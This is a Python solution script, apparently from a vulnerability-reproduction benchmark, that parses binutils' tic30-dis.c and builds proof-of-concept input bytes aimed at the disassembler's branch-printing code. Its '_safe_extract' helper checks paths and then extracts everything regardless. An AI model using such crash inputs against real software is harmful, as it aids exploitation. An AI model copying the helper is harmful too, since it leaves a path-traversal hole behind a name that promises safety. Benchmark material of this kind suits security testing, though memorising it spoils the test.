import os
import tarfile
import tempfile
import re
from typing import List, Tuple, Set

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        extract_dir = tempfile.mkdtemp(prefix="tic30_src_")
        self._safe_extract(src_path, extract_dir)
        # Find tic30-dis.c
        tic30_files = self._find_files(extract_dir, target_names={"tic30-dis.c"})
        words: Set[int] = set()
        for fpath in tic30_files:
            try:
                with open(fpath, "r", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue
            words.update(self._extract_branch_words(content))

        # If we couldn't parse any entries, craft a broad fallback
        if not words:
            # Broad fallback: multiple commonly-structured bit patterns
            # This attempts to maximize chances of hitting various decode tables
            candidates = [
                0xFFFFFFFF, 0x00000000, 0xAAAAAAAA, 0x55555555,
                0xF0F0F0F0, 0x0F0F0F0F, 0xCCCCCCCC, 0x33333333,
                0x96969696, 0x69696969
            ]
            words.update(candidates)

        # Limit the number of distinct words to keep the PoC reasonably small
        # Collect up to 8 distinct words
        limited_words = list(words)[:8]

        # Build PoC bytes: include both big-endian and little-endian for robustness
        out = bytearray()
        for w in limited_words:
            try:
                out += int(w & 0xFFFFFFFF).to_bytes(4, "big")
                out += int(w & 0xFFFFFFFF).to_bytes(4, "little")
            except OverflowError:
                # Skip values that don't fit
                continue

        # Ensure at least 10 bytes in output
        if len(out) < 10:
            # Pad with zeros if needed
            out += b"\x00" * (10 - len(out))

        return bytes(out)

    def _safe_extract(self, tar_path: str, dest_dir: str) -> None:
        try:
            with tarfile.open(tar_path, "r:*") as tar:
                for member in tar.getmembers():
                    member_path = os.path.join(dest_dir, member.name)
                    if not self._is_within_directory(dest_dir, member_path):
                        continue
                tar.extractall(dest_dir)
        except Exception:
            # If extraction fails, treat src_path as a directory fallback
            if os.path.isdir(tar_path):
                # Nothing to extract
                pass

    def _is_within_directory(self, directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        prefix = os.path.commonprefix([abs_directory, abs_target])
        return prefix == abs_directory

    def _find_files(self, root: str, target_names: Set[str]) -> List[str]:
        res = []
        lower_targets = {n.lower() for n in target_names}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.lower() in lower_targets:
                    res.append(os.path.join(dirpath, fn))
        return res

    def _remove_comments(self, s: str) -> str:
        # Remove C and C++ comments
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*?$", "", s, flags=re.M)
        return s

    def _find_block_around(self, content: str, idx: int) -> Tuple[int, int]:
        # Find the nearest enclosing { ... } block around idx
        # Scan backward to find matching '{'
        level = 0
        start = -1
        j = idx - 1
        while j >= 0:
            c = content[j]
            if c == '}':
                level += 1
            elif c == '{':
                if level == 0:
                    start = j
                    break
                else:
                    level -= 1
            j -= 1
        if start == -1:
            return -1, -1
        # Scan forward to find the matching '}'
        level = 1
        k = start + 1
        end = -1
        while k < len(content):
            c = content[k]
            if c == '{':
                level += 1
            elif c == '}':
                level -= 1
                if level == 0:
                    end = k
                    break
            k += 1
        return start, end

    def _parse_last_two_numbers_before(self, text: str, marker: str) -> Tuple[int, int]:
        # Extract the last two numeric constants before 'marker' in 'text'
        pos = text.find(marker)
        if pos == -1:
            return None
        pre = text[:pos]
        pre = self._remove_comments(pre)
        # Allow hex with optional U/L suffixes, decimals likewise
        nums = re.findall(r"(?:0[xX][0-9a-fA-F]+|[-+]?\b\d+\b)", pre)
        if len(nums) < 2:
            return None
        a = self._to_int(nums[-2])
        b = self._to_int(nums[-1])
        if a is None or b is None:
            return None
        return (a, b)

    def _to_int(self, s: str):
        s = s.strip()
        # Strip trailing type suffixes if any (u, U, l, L)
        s = re.sub(r"[uUlL]+$", "", s)
        try:
            if s.lower().startswith("0x"):
                return int(s, 16)
            else:
                return int(s, 10)
        except Exception:
            return None

    def _extract_branch_words(self, content: str) -> Set[int]:
        words: Set[int] = set()
        # Search all occurrences of 'print_branch'
        idx = 0
        while True:
            idx = content.find("print_branch", idx)
            if idx == -1:
                break
            start, end = self._find_block_around(content, idx)
            if start != -1 and end != -1:
                block = content[start:end+1]
                pair = self._parse_last_two_numbers_before(block, "print_branch")
                if pair:
                    a, b = pair
                    # We don't know which is mask/match; try both combinations
                    # w1 assumes a=match, b=mask
                    w1 = (a | (~b & 0xFFFFFFFF)) & 0xFFFFFFFF
                    # w2 assumes b=match, a=mask
                    w2 = (b | (~a & 0xFFFFFFFF)) & 0xFFFFFFFF
                    words.add(w1)
                    words.add(w2)
            idx += len("print_branch")
        return words
